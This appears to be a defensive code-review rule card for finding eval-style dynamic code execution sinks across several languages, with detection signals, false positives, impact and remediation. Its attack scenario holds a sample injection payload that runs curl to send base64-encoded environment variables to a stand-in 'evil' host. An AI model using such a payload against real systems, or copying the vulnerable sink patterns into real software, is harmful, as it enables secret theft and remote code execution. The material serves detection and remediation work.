---
id: P77
name: EvalDynamicExecution
refs: ASVS V5.3.4 / WSTG-INPV-11, WSTG-INPV-12 / CS: Injection Prevention, OS Command Injection Defense
requires: []
---

# P77 — EvalDynamicExecution

## Overview
Dynamic code execution vulnerabilities occur when user- or externally-controlled data is fed into an interpreter that treats the input as **code rather than data**. Sinks include `eval()` / `new Function()` in JavaScript, `child_process.exec` with a shell string, Python `eval()` / `exec()` / `compile()`, `pickle.loads`, Ruby `eval` / `instance_eval` / `class_eval`, PHP `eval` / `create_function` / `assert`, Java `ScriptEngine.eval`, the Nashorn/GraalVM `eval`, and Go's rarely-misused `reflect`. The root cause is conflating a data channel with a code channel: a template, formula, math expression, rule, or "plugin path" is accepted from an untrusted source and handed to an interpreter that has full access to the host language, its standard library, and the process's ambient credentials. Unlike SQL injection (a constrained DSL), code injection typically yields **arbitrary code execution** within the application process — the most severe server-side primitive short of a memory-corruption exploit. VM-based "sandboxes" (`vm2`, `vm.runInNewContext`, PyPy sandbox, Seccomp-less containers) are routinely escapable and must not be treated as a security boundary on their own.

## What to check
- Does any code path pass request-derived data (`req.body`, `req.query`, headers, file contents, message-queue payloads, DB-stored user content) into `eval`, `Function()`, `vm.runInContext` / `runInNewContext`, `child_process.exec`/`execSync` (shell-form), `vm.Script`, `vm2`, Python `eval`/`exec`/`compile`, `pickle.loads`/`yaml.load` (unsafe), Ruby `eval`/`instance_eval`/`class_eval`/`module_eval`, PHP `eval`/`assert`/`create_function`/`preg_replace` with `/e`, Java `ScriptEngine.eval` / `ToolProvider.getSystemJavaCompiler`, or dynamic `import()`/`require()`/`include()` of a user-named path?
- For "calculator", "formula", "spreadsheet cell", "rule engine", "expression", or "filter query" features, is evaluation delegated to `eval`/`Function` instead of a purpose-built parser (e.g. `expr-eval`, `mathjs.evaluate` with a restricted scope, `simple-eval`, `formulajs`)?
- Is a VM sandbox (`vm.runInNewContext`, `isolated-vm`, `vm2`, `quickjs-emscripten`, Python `RestrictedPython`, `subprocess`-in-container) used as the **sole** control, with no process-level isolation (separate OS user, seccomp, no network, dropped capabilities)? VM escapes for `vm`/`vm2` are publicly documented.
- Are dynamic `import(<string>)` / `require(<string>)` / `include <string>` / `dlopen` calls given a path that includes user input, enabling local-file-read or arbitrary module load (path traversal → arbitrary code execution)?
- For serialized payloads (Python pickle, PHP `unserialize`, Ruby `Marshal.load`, Java native serialization, Node `node-serialize`/`funcster`), is deserialization of untrusted data reaching an eval-equivalent sink (gadget chains)? (See P79 — Deserialization.)
- Does a "templating" route compile a user-supplied template string (`ejs.render(userTpl)`, `nunjucks.renderString`, `Handlebars.compile(userTpl)`, Jinja `Template(userTpl)`, Twig `createTemplate`) — most template engines allow code execution via template syntax?
- Is `child_process.exec`/`execSync` used where `execFile`/`spawn` (argv array, no shell) would suffice, with any user data interpolated into the command string? (See P80 — OS Command Injection.)
- Are regex, SQL fragments, or format strings built via string concatenation then passed through an eval-family sink (`new Function('return ' + sqlFragment)`)?

## Static signals
JavaScript / Node:
- `eval(req.body.expr)`, `eval('(' + input + ')')`, `eval(\`return ${user}\`)`
- `new Function('return ' + req.body.formula)()`, `new Function('x', 'return ' + user)`
- `vm.runInNewContext(userCode, sandbox)`, `vm.runInContext(...)`, `new vm.Script(userCode).runInThisContext()`
- `require('vm2')` / `require('isolated-vm')` used without timeout, memory cap, and process isolation
- `child_process.exec(\`convert ${req.body.file}\`)`, `execSync('git commit -m ' + msg)` (shell-form → also OS command injection)
- `await import(req.body.module)`, `require(req.params.path)` (dynamic module load)
- Template-as-code: `ejs.render(req.body.tpl)`, `nunjucks.renderString(userTpl)`, `Handlebars.compile(userTpl)`
- `JSON.parse` of trusted config that then feeds `new Function`; `vm.runInThisContext(Buffer.from(req.body).toString())`

Python:
- `eval(request.json['expr'])`, `exec(user_code)`, `compile(user_code, '<s>', 'exec')`
- `pickle.loads(request.data)`, `cPickle.loads(...)`, `yaml.load(doc)` (without `Loader=SafeLoader`), `marshal.loads(...)`
- `__import__(user_module)`, `importlib.import_module(user_name)`
- Jinja2 `Template(user_str).render(...)`, Mako `Template(user_str)` — both execute Python via template syntax
- `subprocess.call(user_str, shell=True)` (also OS command injection)

Ruby:
- `eval(params[:expr])`, `instance_eval(user_code)`, `class_eval(user_code)`, `module_eval`
- `Marshal.load(request.body)`, `Oj.load(json, mode: :object)` (object mode → gadget RCE)
- ERB `result` binding a user template

PHP:
- `eval($_POST['code'])`, `assert($_GET['cond'])` (PHP<8 acts as eval), `create_function('$a', $user)`
- `preg_replace('/' . $pattern . '/e', ...)` (PHP<7 `/e` modifier = eval)
- `unserialize($_COOKIE['data'])` (POP-chain RCE), `system`/`shell_exec`/`exec`/`passthru`/backticks with user data
- `include($user_path)` (LFI → RCE via log poisoning / session file)

Java / JVM:
- `ScriptEngine engine = ...; engine.eval(userExpr)` (Nashorn / GraalJS / Groovy)
- `ToolProvider.getSystemJavaCompiler()` compiling user source; Groovy `GroovyShell.evaluate(userCode)`
- `Runtime.exec("cmd " + user)` / `ProcessBuilder` with shell-form string
- `ObjectInputStream.readObject()` on untrusted data → gadget chain RCE

Go:
- (Rare) `reflect`-driven invocation, `plugin.Open(userPath)`, or shelling out via `exec.Command("sh", "-c", userStr)`
- Templating: `text/template` does not execute Go code, but custom `Funcmap` entries may

## False positives
- Input is restricted to a **strict allow-list** (e.g. an enumerated set of field names, or a UUID / integer identifier) and the sink only selects among pre-defined safe operations — not free-form code. Confirm the allow-list is enforced *before* reaching the sink and cannot be bypassed.
- The "eval" sink is actually a **safe expression evaluator** with no access to identifiers or I/O (e.g. `mathjs.evaluate(expr, { scope })` with a frozen, data-only scope; `expr-eval`; `formulajs`; or `jq` over a data object). Verify the scope contains no callable/gadget and that `mathjs` does not have `import`/`require`-style functions exposed.
- Code execution is genuinely required (e.g. a code-runner, rules engine, or analytics feature) but is performed inside a **hardened sandbox with process-level isolation**: a dedicated VM/microVM (Firecracker, gVisor, Kata), separate unprivileged OS user, seccomp filter, no network egress, read-only rootfs, memory + CPU + wall-clock limits, and ephemeral credentials. Such cases are typically Medium (residual DoS / sandbox-escape risk), not Critical.
- `vm.runInNewContext` is used **only** for serializing untrusted *data* (e.g. parsing JSON-like input) where the script is fully server-controlled and the untrusted value is a sandbox variable — not the script body. Still prefer `JSON.parse`.
- The dynamic `import()`/`require()` argument is built from a server-controlled list joined with a user-chosen suffix that is validated against an allow-list (plugin registry pattern) — confirm no traversal characters survive.
- Template strings are rendered with an engine whose auto-escaping and sandboxing prevent code execution (e.g. Liquid with no custom tags, Mustache) and the *template source itself* is server-controlled, not user-supplied.

## Attack scenario
1. A SaaS app offers a "custom alert formula" field (`req.body.formula`) and evaluates it server-side via `new Function('price', 'return ' + formula)`.
2. The attacker submits `price; (async()=>{ const f=await import('child_process'); f.execSync('curl https://evil/?d=$(env | base64)'); })()` (or, in Python, `__import__('os').system('curl ...')`).
3. The sink executes in the web process, inheriting its filesystem and network access and any mounted cloud credentials (`AWS_*`, DB connection strings, signing keys in env vars).
4. The attacker pivots to the database, exfiltrates customer records, and/or implants a persistent webshell / cron job for long-term access. If the process runs as root or in Kubernetes with elevated RBAC, the host/cluster may be compromised.
5. With a `vm2`-style "sandbox" the attacker uses a known prototype-pollution / `Proxy` escape to break out of the sandbox and reach the same primitives.

## Impact
- **Confidentiality**: full read of process secrets, env vars, cloud credentials, DB contents, and source code; lateral movement.
- **Integrity**: arbitrary write within the process — mutate records, mint admin accounts, alter business logic, sign payloads with the app's keys, backdoor the deployment.
- **Availability**: process kill, resource exhaustion (cryptominer, fork bomb), ransomware-style data wipe/encrypt.
- Severity scales with the runtime's blast radius: a stateless worker on an isolated VM is High; the same sink in the primary web process with cloud credentials and DB access is **Critical** (CVSS ~9.8 when reachable by unauthenticated input).

## Remediation
Do not interpret untrusted input as code. Use a purpose-built parser for structured input, and prefer the argv-array (no-shell) form for any subprocess:
```ts
// VULNERABLE — user formula evaluated as code
const result = new Function('price', `return ${req.body.formula}`)(price);

// SAFE — restricted expression parser, data-only scope
import { Parser } from 'expr-eval';
const parser = new Parser({ operators: { add: true, multiply: true, conditional: false } });
// build the expression from an allow-list of server-known field names, not user text:
const result = parser.parse('price * qty').evaluate({ price, qty });
```
For genuinely user-supplied code (code-runner / plugin features), enforce defense-in-depth: run inside a microVM or gVisor sandbox as an unprivileged user, with seccomp, no network, read-only rootfs, CPU/memory/wall-clock caps, and ephemeral throwaway credentials — never the main process's identity.

## References
- OWASP ASVS V5.3.4 — Verify the app does not evaluate user input as code; V10.x — Business logic / malicious-code controls
- OWASP WSTG-INPV-11 (Code Injection), WSTG-INPV-12 (Command Injection), WSTG-INPV-09 (LDAP — related dynamic-eval family)
- OWASP Cheat Sheets: Injection Prevention, OS Command Injection Defense, Deserialization, Unsafe Code Execution / Sandbox guidance
